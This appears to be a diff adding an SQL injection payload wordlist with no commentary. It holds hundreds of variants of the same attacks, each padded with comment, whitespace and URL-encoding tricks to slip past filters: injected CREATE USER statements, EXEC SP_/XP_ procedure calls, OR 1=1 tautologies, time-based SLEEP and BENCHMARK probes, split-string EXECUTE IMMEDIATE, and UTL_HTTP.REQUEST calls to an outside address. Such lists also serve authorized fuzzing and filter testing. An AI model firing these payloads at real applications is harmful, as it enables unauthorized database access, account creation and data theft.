+'CREATE/**/USER/**/NAME/**/IDENTIFIED/**/BY/**/'PASS123'/**/-- %23
+'create/**/user/**/name/**/identified/**/by/**/'pass123'/**/---- 
+'CREATE/**/USER/**/NAME/**/IDENTIFIED/**/BY/**/'PASS123'/**/---- 
+'create%20user%20name%20identified%20by%20'pass123'%20--
+'CREATE%20USER%20NAME%20IDENTIFIED%20BY%20'PASS123'%20--
+'create%20user%20name%20identified%20by%20'pass123'%20-- -- 
+'CREATE%20USER%20NAME%20IDENTIFIED%20BY%20'PASS123'%20-- -- 
+'create%20user%20name%20identified%20by%20'pass123'%20-- -- -
+'CREATE%20USER%20NAME%20IDENTIFIED%20BY%20'PASS123'%20-- -- -
+'create%20user%20name%20identified%20by%20'pass123'%20-- --+
+'CREATE%20USER%20NAME%20IDENTIFIED%20BY%20'PASS123'%20-- --+
+'create%20user%20name%20identified%20by%20'pass123'%20-- #
+'CREATE%20USER%20NAME%20IDENTIFIED%20BY%20'PASS123'%20-- #
+'create%20user%20name%20identified%20by%20'pass123'%20--/*
+'CREATE%20USER%20NAME%20IDENTIFIED%20BY%20'PASS123'%20--/*
+'create%20user%20name%20identified%20by%20'pass123'%20-- %23
+'CREATE%20USER%20NAME%20IDENTIFIED%20BY%20'PASS123'%20-- %23
+'create%20user%20name%20identified%20by%20'pass123'%20---- 
+'CREATE%20USER%20NAME%20IDENTIFIED%20BY%20'PASS123'%20---- 
+'create+user+name+identified+by+'pass123'+--
+'CREATE+USER+NAME+IDENTIFIED+BY+'PASS123'+--
+'create+user+name+identified+by+'pass123'+-- -- 
+'CREATE+USER+NAME+IDENTIFIED+BY+'PASS123'+-- -- 
+'create+user+name+identified+by+'pass123'+-- -- -
+'CREATE+USER+NAME+IDENTIFIED+BY+'PASS123'+-- -- -
+'create+user+name+identified+by+'pass123'+-- --+
+'CREATE+USER+NAME+IDENTIFIED+BY+'PASS123'+-- --+
+'create+user+name+identified+by+'pass123'+-- #
+'CREATE+USER+NAME+IDENTIFIED+BY+'PASS123'+-- #
+'create+user+name+identified+by+'pass123'+--/*
+'CREATE+USER+NAME+IDENTIFIED+BY+'PASS123'+--/*
+'create+user+name+identified+by+'pass123'+-- %23
+'CREATE+USER+NAME+IDENTIFIED+BY+'PASS123'+-- %23
+'create+user+name+identified+by+'pass123'+---- 
+'CREATE+USER+NAME+IDENTIFIED+BY+'PASS123'+---- 
+'create\tuser\tname\tidentified\tby\t'pass123'\t--
+'CREATE\tUSER\tNAME\tIDENTIFIED\tBY\t'PASS123'\t--
+'create\tuser\tname\tidentified\tby\t'pass123'\t-- -- 
+'CREATE\tUSER\tNAME\tIDENTIFIED\tBY\t'PASS123'\t-- -- 
+'create\tuser\tname\tidentified\tby\t'pass123'\t-- -- -
+'CREATE\tUSER\tNAME\tIDENTIFIED\tBY\t'PASS123'\t-- -- -
+'create\tuser\tname\tidentified\tby\t'pass123'\t-- --+
+'CREATE\tUSER\tNAME\tIDENTIFIED\tBY\t'PASS123'\t-- --+
+'create\tuser\tname\tidentified\tby\t'pass123'\t-- #
+'CREATE\tUSER\tNAME\tIDENTIFIED\tBY\t'PASS123'\t-- #
+'create\tuser\tname\tidentified\tby\t'pass123'\t--/*
+'CREATE\tUSER\tNAME\tIDENTIFIED\tBY\t'PASS123'\t--/*
+'create\tuser\tname\tidentified\tby\t'pass123'\t-- %23
+'CREATE\tUSER\tNAME\tIDENTIFIED\tBY\t'PASS123'\t-- %23
+'create\tuser\tname\tidentified\tby\t'pass123'\t---- 
+'CREATE\tUSER\tNAME\tIDENTIFIED\tBY\t'PASS123'\t---- 
+' '
+' ' -- 
+' ' -- -
+' ' --+
+' ' #
+' '/*
+' ' %23
+' '-- 
+'/**/'
+'/**/' -- 
+'/**/' -- -
+'/**/' --+
+'/**/' #
+'/**/'/*
+'/**/' %23
+'/**/'-- 
+'%20'
+'%20' -- 
+'%20' -- -
+'%20' --+
+'%20' #
+'%20'/*
+'%20' %23
+'%20'-- 
+'+'
+'+' -- 
+'+' -- -
+'+' --+
+'+' #
+'+'/*
+'+' %23
+'+'-- 
+'\t'
+'\t' -- 
+'\t' -- -
+'\t' --+
+'\t' #
+'\t'/*
+'\t' %23
+'\t'-- 
+1 exec sp_ (or exec xp_)
+1 EXEC SP_ (OR EXEC XP_)
+1 exec sp_ (or exec xp_) -- 
+1 EXEC SP_ (OR EXEC XP_) -- 
+1 exec sp_ (or exec xp_) -- -
+1 EXEC SP_ (OR EXEC XP_) -- -
+1 exec sp_ (or exec xp_) --+
+1 EXEC SP_ (OR EXEC XP_) --+
+1 exec sp_ (or exec xp_) #
+1 EXEC SP_ (OR EXEC XP_) #
+1 exec sp_ (or exec xp_)/*
+1 EXEC SP_ (OR EXEC XP_)/*
+1 exec sp_ (or exec xp_) %23
+1 EXEC SP_ (OR EXEC XP_) %23
+1 exec sp_ (or exec xp_)-- 
+1 EXEC SP_ (OR EXEC XP_)-- 
+1/**/exec/**/sp_/**/(or/**/exec/**/xp_)
+1/**/EXEC/**/SP_/**/(OR/**/EXEC/**/XP_)
+1/**/exec/**/sp_/**/(or/**/exec/**/xp_) -- 
+1/**/EXEC/**/SP_/**/(OR/**/EXEC/**/XP_) -- 
+1/**/exec/**/sp_/**/(or/**/exec/**/xp_) -- -
+1/**/EXEC/**/SP_/**/(OR/**/EXEC/**/XP_) -- -
+1/**/exec/**/sp_/**/(or/**/exec/**/xp_) --+
+1/**/EXEC/**/SP_/**/(OR/**/EXEC/**/XP_) --+
+1/**/exec/**/sp_/**/(or/**/exec/**/xp_) #
+1/**/EXEC/**/SP_/**/(OR/**/EXEC/**/XP_) #
+1/**/exec/**/sp_/**/(or/**/exec/**/xp_)/*
+1/**/EXEC/**/SP_/**/(OR/**/EXEC/**/XP_)/*
+1/**/exec/**/sp_/**/(or/**/exec/**/xp_) %23
+1/**/EXEC/**/SP_/**/(OR/**/EXEC/**/XP_) %23
+1/**/exec/**/sp_/**/(or/**/exec/**/xp_)-- 
+1/**/EXEC/**/SP_/**/(OR/**/EXEC/**/XP_)-- 
+1%20exec%20sp_%20(or%20exec%20xp_)
+1%20EXEC%20SP_%20(OR%20EXEC%20XP_)
+1%20exec%20sp_%20(or%20exec%20xp_) -- 
+1%20EXEC%20SP_%20(OR%20EXEC%20XP_) -- 
+1%20exec%20sp_%20(or%20exec%20xp_) -- -
+1%20EXEC%20SP_%20(OR%20EXEC%20XP_) -- -
+1%20exec%20sp_%20(or%20exec%20xp_) --+
+1%20EXEC%20SP_%20(OR%20EXEC%20XP_) --+
+1%20exec%20sp_%20(or%20exec%20xp_) #
+1%20EXEC%20SP_%20(OR%20EXEC%20XP_) #
+1%20exec%20sp_%20(or%20exec%20xp_)/*
+1%20EXEC%20SP_%20(OR%20EXEC%20XP_)/*
+1%20exec%20sp_%20(or%20exec%20xp_) %23
+1%20EXEC%20SP_%20(OR%20EXEC%20XP_) %23
+1%20exec%20sp_%20(or%20exec%20xp_)-- 
+1%20EXEC%20SP_%20(OR%20EXEC%20XP_)-- 
+1+exec+sp_+(or+exec+xp_)
+1+EXEC+SP_+(OR+EXEC+XP_)
+1+exec+sp_+(or+exec+xp_) -- 
+1+EXEC+SP_+(OR+EXEC+XP_) -- 
+1+exec+sp_+(or+exec+xp_) -- -
+1+EXEC+SP_+(OR+EXEC+XP_) -- -
+1+exec+sp_+(or+exec+xp_) --+
+1+EXEC+SP_+(OR+EXEC+XP_) --+
+1+exec+sp_+(or+exec+xp_) #
+1+EXEC+SP_+(OR+EXEC+XP_) #
+1+exec+sp_+(or+exec+xp_)/*
+1+EXEC+SP_+(OR+EXEC+XP_)/*
+1+exec+sp_+(or+exec+xp_) %23
+1+EXEC+SP_+(OR+EXEC+XP_) %23
+1+exec+sp_+(or+exec+xp_)-- 
+1+EXEC+SP_+(OR+EXEC+XP_)-- 
+1\texec\tsp_\t(or\texec\txp_)
+1\tEXEC\tSP_\t(OR\tEXEC\tXP_)
+1\texec\tsp_\t(or\texec\txp_) -- 
+1\tEXEC\tSP_\t(OR\tEXEC\tXP_) -- 
+1\texec\tsp_\t(or\texec\txp_) -- -
+1\tEXEC\tSP_\t(OR\tEXEC\tXP_) -- -
+1\texec\tsp_\t(or\texec\txp_) --+
+1\tEXEC\tSP_\t(OR\tEXEC\tXP_) --+
+1\texec\tsp_\t(or\texec\txp_) #
+1\tEXEC\tSP_\t(OR\tEXEC\tXP_) #
+1\texec\tsp_\t(or\texec\txp_)/*
+1\tEXEC\tSP_\t(OR\tEXEC\tXP_)/*
+1\texec\tsp_\t(or\texec\txp_) %23
+1\tEXEC\tSP_\t(OR\tEXEC\tXP_) %23
+1\texec\tsp_\t(or\texec\txp_)-- 
+1\tEXEC\tSP_\t(OR\tEXEC\tXP_)-- 
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),\u200bSLEEP(1)))OR\"*/
+if(substr(@@version,1,1)<5,benchmark(2000000,sha1(0xde7ec71f1)),sleep(1))/*'xor(if(substr(@@version,1,1)<5,benchmark(2000000,sha1(0xde7ec71f1)),sleep(1)))or'|\"xor(if(substr(@@version,1,1)<5,benchmark(2000000,sha1(0xde7ec71f1)),\u200bsleep(1)))or\"*/
+IF(SUBSTR(@@VERSION,1,1)<5,BENCHMARK(2000000,SHA1(0XDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@VERSION,1,1)<5,BENCHMARK(2000000,SHA1(0XDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@VERSION,1,1)<5,BENCHMARK(2000000,SHA1(0XDE7EC71F1)),\u200bSLEEP(1)))OR\"*/
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),\u200bSLEEP(1)))OR\"*/ -- 
+if(substr(@@version,1,1)<5,benchmark(2000000,sha1(0xde7ec71f1)),sleep(1))/*'xor(if(substr(@@version,1,1)<5,benchmark(2000000,sha1(0xde7ec71f1)),sleep(1)))or'|\"xor(if(substr(@@version,1,1)<5,benchmark(2000000,sha1(0xde7ec71f1)),\u200bsleep(1)))or\"*/ -- 
+IF(SUBSTR(@@VERSION,1,1)<5,BENCHMARK(2000000,SHA1(0XDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@VERSION,1,1)<5,BENCHMARK(2000000,SHA1(0XDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@VERSION,1,1)<5,BENCHMARK(2000000,SHA1(0XDE7EC71F1)),\u200bSLEEP(1)))OR\"*/ -- 
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),\u200bSLEEP(1)))OR\"*/ -- -
+if(substr(@@version,1,1)<5,benchmark(2000000,sha1(0xde7ec71f1)),sleep(1))/*'xor(if(substr(@@version,1,1)<5,benchmark(2000000,sha1(0xde7ec71f1)),sleep(1)))or'|\"xor(if(substr(@@version,1,1)<5,benchmark(2000000,sha1(0xde7ec71f1)),\u200bsleep(1)))or\"*/ -- -
+IF(SUBSTR(@@VERSION,1,1)<5,BENCHMARK(2000000,SHA1(0XDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@VERSION,1,1)<5,BENCHMARK(2000000,SHA1(0XDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@VERSION,1,1)<5,BENCHMARK(2000000,SHA1(0XDE7EC71F1)),\u200bSLEEP(1)))OR\"*/ -- -
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),\u200bSLEEP(1)))OR\"*/ --+
+if(substr(@@version,1,1)<5,benchmark(2000000,sha1(0xde7ec71f1)),sleep(1))/*'xor(if(substr(@@version,1,1)<5,benchmark(2000000,sha1(0xde7ec71f1)),sleep(1)))or'|\"xor(if(substr(@@version,1,1)<5,benchmark(2000000,sha1(0xde7ec71f1)),\u200bsleep(1)))or\"*/ --+
+IF(SUBSTR(@@VERSION,1,1)<5,BENCHMARK(2000000,SHA1(0XDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@VERSION,1,1)<5,BENCHMARK(2000000,SHA1(0XDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@VERSION,1,1)<5,BENCHMARK(2000000,SHA1(0XDE7EC71F1)),\u200bSLEEP(1)))OR\"*/ --+
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),\u200bSLEEP(1)))OR\"*/ #
+if(substr(@@version,1,1)<5,benchmark(2000000,sha1(0xde7ec71f1)),sleep(1))/*'xor(if(substr(@@version,1,1)<5,benchmark(2000000,sha1(0xde7ec71f1)),sleep(1)))or'|\"xor(if(substr(@@version,1,1)<5,benchmark(2000000,sha1(0xde7ec71f1)),\u200bsleep(1)))or\"*/ #
+IF(SUBSTR(@@VERSION,1,1)<5,BENCHMARK(2000000,SHA1(0XDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@VERSION,1,1)<5,BENCHMARK(2000000,SHA1(0XDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@VERSION,1,1)<5,BENCHMARK(2000000,SHA1(0XDE7EC71F1)),\u200bSLEEP(1)))OR\"*/ #
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),\u200bSLEEP(1)))OR\"*//*
+if(substr(@@version,1,1)<5,benchmark(2000000,sha1(0xde7ec71f1)),sleep(1))/*'xor(if(substr(@@version,1,1)<5,benchmark(2000000,sha1(0xde7ec71f1)),sleep(1)))or'|\"xor(if(substr(@@version,1,1)<5,benchmark(2000000,sha1(0xde7ec71f1)),\u200bsleep(1)))or\"*//*
+IF(SUBSTR(@@VERSION,1,1)<5,BENCHMARK(2000000,SHA1(0XDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@VERSION,1,1)<5,BENCHMARK(2000000,SHA1(0XDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@VERSION,1,1)<5,BENCHMARK(2000000,SHA1(0XDE7EC71F1)),\u200bSLEEP(1)))OR\"*//*
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),\u200bSLEEP(1)))OR\"*/ %23
+if(substr(@@version,1,1)<5,benchmark(2000000,sha1(0xde7ec71f1)),sleep(1))/*'xor(if(substr(@@version,1,1)<5,benchmark(2000000,sha1(0xde7ec71f1)),sleep(1)))or'|\"xor(if(substr(@@version,1,1)<5,benchmark(2000000,sha1(0xde7ec71f1)),\u200bsleep(1)))or\"*/ %23
+IF(SUBSTR(@@VERSION,1,1)<5,BENCHMARK(2000000,SHA1(0XDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@VERSION,1,1)<5,BENCHMARK(2000000,SHA1(0XDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@VERSION,1,1)<5,BENCHMARK(2000000,SHA1(0XDE7EC71F1)),\u200bSLEEP(1)))OR\"*/ %23
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),\u200bSLEEP(1)))OR\"*/-- 
+if(substr(@@version,1,1)<5,benchmark(2000000,sha1(0xde7ec71f1)),sleep(1))/*'xor(if(substr(@@version,1,1)<5,benchmark(2000000,sha1(0xde7ec71f1)),sleep(1)))or'|\"xor(if(substr(@@version,1,1)<5,benchmark(2000000,sha1(0xde7ec71f1)),\u200bsleep(1)))or\"*/-- 
+IF(SUBSTR(@@VERSION,1,1)<5,BENCHMARK(2000000,SHA1(0XDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@VERSION,1,1)<5,BENCHMARK(2000000,SHA1(0XDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@VERSION,1,1)<5,BENCHMARK(2000000,SHA1(0XDE7EC71F1)),\u200bSLEEP(1)))OR\"*/-- 
+\" or 1=1--
+\" OR 1=1--
+\" or 1=1-- -- 
+\" OR 1=1-- -- 
+\" or 1=1-- -- -
+\" OR 1=1-- -- -
+\" or 1=1-- --+
+\" OR 1=1-- --+
+\" or 1=1-- #
+\" OR 1=1-- #
+\" or 1=1--/*
+\" OR 1=1--/*
+\" or 1=1-- %23
+\" OR 1=1-- %23
+\" or 1=1---- 
+\" OR 1=1---- 
+\"/**/or/**/1=1--
+\"/**/OR/**/1=1--
+\"/**/or/**/1=1-- -- 
+\"/**/OR/**/1=1-- -- 
+\"/**/or/**/1=1-- -- -
+\"/**/OR/**/1=1-- -- -
+\"/**/or/**/1=1-- --+
+\"/**/OR/**/1=1-- --+
+\"/**/or/**/1=1-- #
+\"/**/OR/**/1=1-- #
+\"/**/or/**/1=1--/*
+\"/**/OR/**/1=1--/*
+\"/**/or/**/1=1-- %23
+\"/**/OR/**/1=1-- %23
+\"/**/or/**/1=1---- 
+\"/**/OR/**/1=1---- 
+\"%20or%201=1--
+\"%20OR%201=1--
+\"%20or%201=1-- -- 
+\"%20OR%201=1-- -- 
+\"%20or%201=1-- -- -
+\"%20OR%201=1-- -- -
+\"%20or%201=1-- --+
+\"%20OR%201=1-- --+
+\"%20or%201=1-- #
+\"%20OR%201=1-- #
+\"%20or%201=1--/*
+\"%20OR%201=1--/*
+\"%20or%201=1-- %23
+\"%20OR%201=1-- %23
+\"%20or%201=1---- 
+\"%20OR%201=1---- 
+\"+or+1=1--
+\"+OR+1=1--
+\"+or+1=1-- -- 
+\"+OR+1=1-- -- 
+\"+or+1=1-- -- -
+\"+OR+1=1-- -- -
+\"+or+1=1-- --+
+\"+OR+1=1-- --+
+\"+or+1=1-- #
+\"+OR+1=1-- #
+\"+or+1=1--/*
+\"+OR+1=1--/*
+\"+or+1=1-- %23
+\"+OR+1=1-- %23
+\"+or+1=1---- 
+\"+OR+1=1---- 
+\"\tor\t1=1--
+\"\tOR\t1=1--
+\"\tor\t1=1-- -- 
+\"\tOR\t1=1-- -- 
+\"\tor\t1=1-- -- -
+\"\tOR\t1=1-- -- -
+\"\tor\t1=1-- --+
+\"\tOR\t1=1-- --+
+\"\tor\t1=1-- #
+\"\tOR\t1=1-- #
+\"\tor\t1=1--/*
+\"\tOR\t1=1--/*
+\"\tor\t1=1-- %23
+\"\tOR\t1=1-- %23
+\"\tor\t1=1---- 
+\"\tOR\t1=1---- 
+; execute immediate 'sel' || 'ect us' || 'er'
+; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'
+; execute immediate 'sel' || 'ect us' || 'er' -- 
+; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER' -- 
+; execute immediate 'sel' || 'ect us' || 'er' -- -
+; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER' -- -
+; execute immediate 'sel' || 'ect us' || 'er' --+
+; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER' --+
+; execute immediate 'sel' || 'ect us' || 'er' #
+; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER' #
+; execute immediate 'sel' || 'ect us' || 'er'/*
+; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'/*
+; execute immediate 'sel' || 'ect us' || 'er' %23
+; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER' %23
+; execute immediate 'sel' || 'ect us' || 'er'-- 
+; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'-- 
+;/**/execute/**/immediate/**/'sel'/**/||/**/'ect/**/us'/**/||/**/'er'
+;/**/EXECUTE/**/IMMEDIATE/**/'SEL'/**/||/**/'ECT/**/US'/**/||/**/'ER'
+;/**/execute/**/immediate/**/'sel'/**/||/**/'ect/**/us'/**/||/**/'er' -- 
+;/**/EXECUTE/**/IMMEDIATE/**/'SEL'/**/||/**/'ECT/**/US'/**/||/**/'ER' -- 
+;/**/execute/**/immediate/**/'sel'/**/||/**/'ect/**/us'/**/||/**/'er' -- -
+;/**/EXECUTE/**/IMMEDIATE/**/'SEL'/**/||/**/'ECT/**/US'/**/||/**/'ER' -- -
+;/**/execute/**/immediate/**/'sel'/**/||/**/'ect/**/us'/**/||/**/'er' --+
+;/**/EXECUTE/**/IMMEDIATE/**/'SEL'/**/||/**/'ECT/**/US'/**/||/**/'ER' --+
+;/**/execute/**/immediate/**/'sel'/**/||/**/'ect/**/us'/**/||/**/'er' #
+;/**/EXECUTE/**/IMMEDIATE/**/'SEL'/**/||/**/'ECT/**/US'/**/||/**/'ER' #
+;/**/execute/**/immediate/**/'sel'/**/||/**/'ect/**/us'/**/||/**/'er'/*
+;/**/EXECUTE/**/IMMEDIATE/**/'SEL'/**/||/**/'ECT/**/US'/**/||/**/'ER'/*
+;/**/execute/**/immediate/**/'sel'/**/||/**/'ect/**/us'/**/||/**/'er' %23
+;/**/EXECUTE/**/IMMEDIATE/**/'SEL'/**/||/**/'ECT/**/US'/**/||/**/'ER' %23
+;/**/execute/**/immediate/**/'sel'/**/||/**/'ect/**/us'/**/||/**/'er'-- 
+;/**/EXECUTE/**/IMMEDIATE/**/'SEL'/**/||/**/'ECT/**/US'/**/||/**/'ER'-- 
+;%20execute%20immediate%20'sel'%20||%20'ect%20us'%20||%20'er'
+;%20EXECUTE%20IMMEDIATE%20'SEL'%20||%20'ECT%20US'%20||%20'ER'
+;%20execute%20immediate%20'sel'%20||%20'ect%20us'%20||%20'er' -- 
+;%20EXECUTE%20IMMEDIATE%20'SEL'%20||%20'ECT%20US'%20||%20'ER' -- 
+;%20execute%20immediate%20'sel'%20||%20'ect%20us'%20||%20'er' -- -
+;%20EXECUTE%20IMMEDIATE%20'SEL'%20||%20'ECT%20US'%20||%20'ER' -- -
+;%20execute%20immediate%20'sel'%20||%20'ect%20us'%20||%20'er' --+
+;%20EXECUTE%20IMMEDIATE%20'SEL'%20||%20'ECT%20US'%20||%20'ER' --+
+;%20execute%20immediate%20'sel'%20||%20'ect%20us'%20||%20'er' #
+;%20EXECUTE%20IMMEDIATE%20'SEL'%20||%20'ECT%20US'%20||%20'ER' #
+;%20execute%20immediate%20'sel'%20||%20'ect%20us'%20||%20'er'/*
+;%20EXECUTE%20IMMEDIATE%20'SEL'%20||%20'ECT%20US'%20||%20'ER'/*
+;%20execute%20immediate%20'sel'%20||%20'ect%20us'%20||%20'er' %23
+;%20EXECUTE%20IMMEDIATE%20'SEL'%20||%20'ECT%20US'%20||%20'ER' %23
+;%20execute%20immediate%20'sel'%20||%20'ect%20us'%20||%20'er'-- 
+;%20EXECUTE%20IMMEDIATE%20'SEL'%20||%20'ECT%20US'%20||%20'ER'-- 
+;+execute+immediate+'sel'+||+'ect+us'+||+'er'
+;+EXECUTE+IMMEDIATE+'SEL'+||+'ECT+US'+||+'ER'
+;+execute+immediate+'sel'+||+'ect+us'+||+'er' -- 
+;+EXECUTE+IMMEDIATE+'SEL'+||+'ECT+US'+||+'ER' -- 
+;+execute+immediate+'sel'+||+'ect+us'+||+'er' -- -
+;+EXECUTE+IMMEDIATE+'SEL'+||+'ECT+US'+||+'ER' -- -
+;+execute+immediate+'sel'+||+'ect+us'+||+'er' --+
+;+EXECUTE+IMMEDIATE+'SEL'+||+'ECT+US'+||+'ER' --+
+;+execute+immediate+'sel'+||+'ect+us'+||+'er' #
+;+EXECUTE+IMMEDIATE+'SEL'+||+'ECT+US'+||+'ER' #
+;+execute+immediate+'sel'+||+'ect+us'+||+'er'/*
+;+EXECUTE+IMMEDIATE+'SEL'+||+'ECT+US'+||+'ER'/*
+;+execute+immediate+'sel'+||+'ect+us'+||+'er' %23
+;+EXECUTE+IMMEDIATE+'SEL'+||+'ECT+US'+||+'ER' %23
+;+execute+immediate+'sel'+||+'ect+us'+||+'er'-- 
+;+EXECUTE+IMMEDIATE+'SEL'+||+'ECT+US'+||+'ER'-- 
+;\texecute\timmediate\t'sel'\t||\t'ect\tus'\t||\t'er'
+;\tEXECUTE\tIMMEDIATE\t'SEL'\t||\t'ECT\tUS'\t||\t'ER'
+;\texecute\timmediate\t'sel'\t||\t'ect\tus'\t||\t'er' -- 
+;\tEXECUTE\tIMMEDIATE\t'SEL'\t||\t'ECT\tUS'\t||\t'ER' -- 
+;\texecute\timmediate\t'sel'\t||\t'ect\tus'\t||\t'er' -- -
+;\tEXECUTE\tIMMEDIATE\t'SEL'\t||\t'ECT\tUS'\t||\t'ER' -- -
+;\texecute\timmediate\t'sel'\t||\t'ect\tus'\t||\t'er' --+
+;\tEXECUTE\tIMMEDIATE\t'SEL'\t||\t'ECT\tUS'\t||\t'ER' --+
+;\texecute\timmediate\t'sel'\t||\t'ect\tus'\t||\t'er' #
+;\tEXECUTE\tIMMEDIATE\t'SEL'\t||\t'ECT\tUS'\t||\t'ER' #
+;\texecute\timmediate\t'sel'\t||\t'ect\tus'\t||\t'er'/*
+;\tEXECUTE\tIMMEDIATE\t'SEL'\t||\t'ECT\tUS'\t||\t'ER'/*
+;\texecute\timmediate\t'sel'\t||\t'ect\tus'\t||\t'er' %23
+;\tEXECUTE\tIMMEDIATE\t'SEL'\t||\t'ECT\tUS'\t||\t'ER' %23
+;\texecute\timmediate\t'sel'\t||\t'ect\tus'\t||\t'er'-- 
+;\tEXECUTE\tIMMEDIATE\t'SEL'\t||\t'ECT\tUS'\t||\t'ER'-- 
+'||utl_http.request('httP://192.168.1.1/')||'
+'||utl_http.request('http://192.168.1.1/')||'
+'||UTL_HTTP.REQUEST('HTTP://192.168.1.1/')||'
+'||utl_http.request('httP://192.168.1.1/')||' -- 
+'||utl_http.request('http://192.168.1.1/')||' -- 
+'||UTL_HTTP.REQUEST('HTTP://192.168.1.1/')||' -- 
+'||utl_http.request('httP://192.168.1.1/')||' -- -
+'||utl_http.request('http://192.168.1.1/')||' -- -
+'||UTL_HTTP.REQUEST('HTTP://192.168.1.1/')||' -- -
+'||utl_http.request('httP://192.168.1.1/')||' --+
+'||utl_http.request('http://192.168.1.1/')||' --+
+'||UTL_HTTP.REQUEST('HTTP://192.168.1.1/')||' --+
+'||utl_http.request('httP://192.168.1.1/')||' #
+'||utl_http.request('http://192.168.1.1/')||' #
+'||UTL_HTTP.REQUEST('HTTP://192.168.1.1/')||' #
+'||utl_http.request('httP://192.168.1.1/')||'/*
+'||utl_http.request('http://192.168.1.1/')||'/*
+'||UTL_HTTP.REQUEST('HTTP://192.168.1.1/')||'/*
+'||utl_http.request('httP://192.168.1.1/')||' %23
+'||utl_http.request('http://192.168.1.1/')||' %23
+'||UTL_HTTP.REQUEST('HTTP://192.168.1.1/')||' %23
+'||utl_http.request('httP://192.168.1.1/')||'-- 
+'||utl_http.request('http://192.168.1.1/')||'-- 
+'||UTL_HTTP.REQUEST('HTTP://192.168.1.1/')||'-- 
+\" or sleep(5)#
+\" OR SLEEP(5)#
+\" or sleep(5)# -- 
+\" OR SLEEP(5)# -- 
+\" or sleep(5)# -- -
+\" OR SLEEP(5)# -- -
+\" or sleep(5)# --+
+\" OR SLEEP(5)# --+
+\" or sleep(5)# #
+\" OR SLEEP(5)# #
+\" or sleep(5)#/*
+\" OR SLEEP(5)#/*
+\" or sleep(5)# %23
+\" OR SLEEP(5)# %23
+\" or sleep(5)#-- 
+\" OR SLEEP(5)#-- 
+\"/**/or/**/sleep(5)#
+\"/**/OR/**/SLEEP(5)#
+\"/**/or/**/sleep(5)# -- 
+\"/**/OR/**/SLEEP(5)# -- 
+\"/**/or/**/sleep(5)# -- -
+\"/**/OR/**/SLEEP(5)# -- -
+\"/**/or/**/sleep(5)# --+
+\"/**/OR/**/SLEEP(5)# --+
+\"/**/or/**/sleep(5)# #
